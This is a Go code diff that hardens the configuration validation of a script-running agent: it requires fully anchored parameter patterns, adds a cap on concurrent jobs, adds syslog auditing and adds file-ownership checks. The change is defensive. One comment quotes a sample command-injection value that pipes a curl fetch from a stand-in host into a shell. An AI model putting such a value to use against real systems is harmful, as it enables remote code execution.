@@ -41,6 +41,11 @@ const (
 	MaxJobHistoryMin     = 10
 	MaxJobHistoryMax     = 100000
 	DefaultMaxJobHistory = 1000
+
+	// MaxConcurrentJobs caps queued+running jobs across ALL actions.
+	MaxConcurrentJobsMin     = 1
+	MaxConcurrentJobsMax     = 1024
+	DefaultMaxConcurrentJobs = 16
 )
 
 // actionNamePattern bounds action names to a safe, predictable charset:
@@ -73,7 +78,15 @@ type Parameter struct {
 	compiled *regexp.Regexp
 }
 
-// Validate compiles the pattern (if any) and checks the type is supported.
+// Validate requires and compiles the pattern and checks the type is
+// supported.
+//
+// A pattern is mandatory: every parameter value reaches a script, so an
+// unconstrained value is never acceptable. The pattern is always matched
+// against the whole value (compiled as ^(?:pattern)$), because an unanchored
+// regexp.MatchString accepts any value that merely contains a match — for
+// example "x; curl evil|sh" against [a-z]+ — and alternations like "^a|b$"
+// are only half-anchored even when the author wrote anchors.
 //
 // Go's regexp package (RE2) guarantees linear-time matching with no
 // catastrophic-backtracking/ReDoS failure mode, unlike backtracking regex
@@ -90,22 +103,28 @@ func (p *Parameter) Validate(name string) error {
 	if p.Type != ParameterTypeString {
 		return fmt.Errorf("parameter %q: unsupported type %q (only %q is supported)", name, p.Type, ParameterTypeString)
 	}
+	if p.Pattern == "" {
+		return fmt.Errorf("parameter %q: pattern is required", name)
+	}
 	if len(p.Pattern) > MaxParameterPatternLen {
 		return fmt.Errorf("parameter %q: pattern exceeds %d bytes", name, MaxParameterPatternLen)
 	}
-	if p.Pattern != "" {
-		re, err := regexp.Compile(p.Pattern)
-		if err != nil {
-			return fmt.Errorf("parameter %q: invalid pattern: %w", name, err)
-		}
-		p.compiled = re
+	re, err := regexp.Compile(`^(?:` + p.Pattern + `)$`)
+	if err != nil {
+		return fmt.Errorf("parameter %q: invalid pattern: %w", name, err)
 	}
+	p.compiled = re
 	return nil
 }
 
 // CheckValue validates a candidate value against this parameter's rules.
+// A parameter whose Validate never succeeded has no compiled pattern and
+// rejects every value rather than accepting unchecked input.
 func (p *Parameter) CheckValue(value string) error {
-	if p.compiled != nil && !p.compiled.MatchString(value) {
+	if p.compiled == nil {
+		return fmt.Errorf("parameter has no validated pattern")
+	}
+	if !p.compiled.MatchString(value) {
 		return fmt.Errorf("value does not match required pattern")
 	}
 	return nil
@@ -151,6 +170,11 @@ type healthConfig struct {
 type securityConfig struct {
 	MTLS   mtlsConfig   `yaml:"mtls"`
 	Health healthConfig `yaml:"health"`
+	// AllowServiceOwnedFiles lets scripts, certificates and the config be
+	// owned by the account Axiom runs as instead of root. Off by default:
+	// a service-owned file is one the service (or a compromised action)
+	// can rewrite. For development and tests only.
+	AllowServiceOwnedFiles bool `yaml:"allow_service_owned_files"`
 }
 
 type listenConfig struct {
@@ -169,7 +193,8 @@ type authorizationConfig struct {
 }
 
 type auditConfig struct {
-	Path string `yaml:"path"`
+	Path   string `yaml:"path"`
+	Syslog bool   `yaml:"syslog"`
 }
 
 type outputConfig struct {
@@ -177,7 +202,8 @@ type outputConfig struct {
 }
 
 type jobsConfig struct {
-	MaxHistory int `yaml:"max_history"`
+	MaxHistory    int `yaml:"max_history"`
+	MaxConcurrent int `yaml:"max_concurrent"`
 }
 
 // rawConfig mirrors the on-disk YAML shape before post-load processing.
@@ -209,14 +235,21 @@ type Config struct {
 
 	HealthAllowAnonymous bool
 
+	// AllowServiceOwnedFiles: see securityConfig.AllowServiceOwnedFiles.
+	AllowServiceOwnedFiles bool
+
 	Actions map[string]*Action
 
 	Identities map[string]*Identity
 
 	AuditLogPath string
+	// AuditSyslog forwards every audit record to journald/syslog in addition
+	// to the local file.
+	AuditSyslog bool
 
-	MaxOutputBytes int
-	MaxJobHistory  int
+	MaxOutputBytes    int
+	MaxJobHistory     int
+	MaxConcurrentJobs int
 }
 
 // Load reads, parses, and strictly validates the configuration at path.
@@ -236,19 +269,22 @@ func Load(path string) (*Config, error) {
 	}
 
 	cfg := &Config{
-		AgentID:              raw.Agent.ID,
-		AgentName:            raw.Agent.Name,
-		ListenAddress:        raw.Agent.Listen.Address,
-		ListenPort:           raw.Agent.Listen.Port,
-		CAFile:               raw.Security.MTLS.CAFile,
-		CertFile:             raw.Security.MTLS.CertFile,
-		KeyFile:              raw.Security.MTLS.KeyFile,
-		HealthAllowAnonymous: raw.Security.Health.AllowAnonymous,
-		Actions:              raw.Actions,
-		Identities:           raw.Authorization.Identities,
-		AuditLogPath:         raw.Audit.Path,
-		MaxOutputBytes:       raw.Output.MaxBytes,
-		MaxJobHistory:        raw.Jobs.MaxHistory,
+		AgentID:                raw.Agent.ID,
+		AgentName:              raw.Agent.Name,
+		ListenAddress:          raw.Agent.Listen.Address,
+		ListenPort:             raw.Agent.Listen.Port,
+		CAFile:                 raw.Security.MTLS.CAFile,
+		CertFile:               raw.Security.MTLS.CertFile,
+		KeyFile:                raw.Security.MTLS.KeyFile,
+		HealthAllowAnonymous:   raw.Security.Health.AllowAnonymous,
+		AllowServiceOwnedFiles: raw.Security.AllowServiceOwnedFiles,
+		Actions:                raw.Actions,
+		Identities:             raw.Authorization.Identities,
+		AuditLogPath:           raw.Audit.Path,
+		AuditSyslog:            raw.Audit.Syslog,
+		MaxOutputBytes:         raw.Output.MaxBytes,
+		MaxJobHistory:          raw.Jobs.MaxHistory,
+		MaxConcurrentJobs:      raw.Jobs.MaxConcurrent,
 	}
 	if cfg.AuditLogPath == "" {
 		cfg.AuditLogPath = defaultAuditLogPath()
@@ -259,6 +295,9 @@ func Load(path string) (*Config, error) {
 	if cfg.MaxJobHistory == 0 {
 		cfg.MaxJobHistory = DefaultMaxJobHistory
 	}
+	if cfg.MaxConcurrentJobs == 0 {
+		cfg.MaxConcurrentJobs = DefaultMaxConcurrentJobs
+	}
 	if cfg.Actions == nil {
 		cfg.Actions = map[string]*Action{}
 	}
@@ -268,6 +307,14 @@ func Load(path string) (*Config, error) {
 
 	if err := cfg.validate(); err != nil {
 		return nil, err
+	}
+	// The config file itself is trusted input (it defines actions and who may
+	// run them): it must not be modifiable by the service account.
+	if err := requireTrustedFile(path, false, cfg.AllowServiceOwnedFiles); err != nil {
+		return nil, fmt.Errorf("config file: %w", err)
+	}
+	if err := requireSecureParentDir(path, cfg.AllowServiceOwnedFiles); err != nil {
+		return nil, fmt.Errorf("config file: %w", err)
 	}
 	return cfg, nil
 }
@@ -296,11 +343,14 @@ func (c *Config) validate() error {
 		return fmt.Errorf("security.mtls: %w", err)
 	}
 	for label, p := range map[string]string{"ca_file": c.CAFile, "cert_file": c.CertFile, "key_file": c.KeyFile} {
+		if err := requireTrustedFile(p, label == "key_file", c.AllowServiceOwnedFiles); err != nil {
+			return fmt.Errorf("security.mtls.%s: %w", label, err)
+		}
 		// A trust anchor (CA) or server key sitting in a directory an
 		// untrusted local user can write to is a full compromise (swap the
 		// CA to mint accepted client certs, or swap the server key to
 		// impersonate the agent) even if the file itself is locked down.
-		if err := requireSecureParentDir(p); err != nil {
+		if err := requireSecureParentDir(p, c.AllowServiceOwnedFiles); err != nil {
 			return fmt.Errorf("security.mtls.%s: %w", label, err)
 		}
 	}
@@ -308,8 +358,14 @@ func (c *Config) validate() error {
 	if !filepath.IsAbs(c.AuditLogPath) {
 		return fmt.Errorf("audit.path must be an absolute path, got %q", c.AuditLogPath)
 	}
-	if err := requireSecureParentDir(c.AuditLogPath); err != nil {
+	// The audit directory is the one place the service account legitimately
+	// owns (the installer creates /var/log/axiom as axiom:axiom 0750), so
+	// service ownership is accepted here; group/world-writable is not.
+	if err := requireSecureParentDir(c.AuditLogPath, true); err != nil {
 		return fmt.Errorf("audit.path: %w", err)
+	}
+	if c.AuditSyslog && !syslogSupported {
+		return fmt.Errorf("audit.syslog is not supported on this platform")
 	}
 
 	if c.MaxOutputBytes < MinOutputBytesLimit || c.MaxOutputBytes > MaxOutputBytesLimit {
@@ -317,6 +373,9 @@ func (c *Config) validate() error {
 	}
 	if c.MaxJobHistory < MaxJobHistoryMin || c.MaxJobHistory > MaxJobHistoryMax {
 		return fmt.Errorf("jobs.max_history must be between %d and %d, got %d", MaxJobHistoryMin, MaxJobHistoryMax, c.MaxJobHistory)
+	}
+	if c.MaxConcurrentJobs < MaxConcurrentJobsMin || c.MaxConcurrentJobs > MaxConcurrentJobsMax {
+		return fmt.Errorf("jobs.max_concurrent must be between %d and %d, got %d", MaxConcurrentJobsMin, MaxConcurrentJobsMax, c.MaxConcurrentJobs)
 	}
 
 	if len(c.Actions) == 0 {
@@ -327,7 +386,7 @@ func (c *Config) validate() error {
 			return fmt.Errorf("actions: invalid action name %q (must match %s)", name, actionNamePattern.String())
 		}
 		a.Name = name
-		if err := validateAction(name, a); err != nil {
+		if err := validateAction(name, a, c.AllowServiceOwnedFiles); err != nil {
 			return err
 		}
 	}
@@ -351,7 +410,7 @@ func (c *Config) validate() error {
 	return nil
 }
 
-func validateAction(name string, a *Action) error {
+func validateAction(name string, a *Action, allowServiceOwned bool) error {
 	if a.Command == "" {
 		return fmt.Errorf("actions.%s.command is required", name)
 	}
@@ -366,7 +425,7 @@ func validateAction(name string, a *Action) error {
 		return fmt.Errorf("actions.%s.concurrency must be %q or %q, got %q", name, ConcurrencyShared, ConcurrencyExclusive, a.Concurrency)
 	}
 
-	if err := validateActionScript(name, a.Command); err != nil {
+	if err := validateActionScript(name, a.Command, allowServiceOwned); err != nil {
 		return err
 	}
 
@@ -384,14 +443,14 @@ func validateAction(name string, a *Action) error {
 	return nil
 }
 
-func validateActionScript(actionName, command string) error {
+func validateActionScript(actionName, command string, allowServiceOwned bool) error {
 	if !filepath.IsAbs(command) {
 		return fmt.Errorf("actions.%s.command must be an absolute path, got %q", actionName, command)
 	}
 	if command != filepath.Clean(command) {
 		return fmt.Errorf("actions.%s.command must be a clean path with no \".\"/\"..\" segments, got %q", actionName, command)
 	}
-	if err := checkScriptSecurity(command); err != nil {
+	if err := checkScriptSecurity(command, allowServiceOwned); err != nil {
 		return fmt.Errorf("actions.%s.command: %w", actionName, err)
 	}
 	// A script with safe ownership/permissions sitting in a directory that
@@ -400,7 +459,7 @@ func validateActionScript(actionName, command string) error {
 	// not the file). Walk every ancestor directory up to (but not
 	// including) the filesystem root and require the same ownership and
 	// non-group/world-writable guarantee.
-	if err := requireSecureParentDir(command); err != nil {
+	if err := requireSecureParentDir(command, allowServiceOwned); err != nil {
 		return fmt.Errorf("actions.%s.command: %w", actionName, err)
 	}
 	return nil
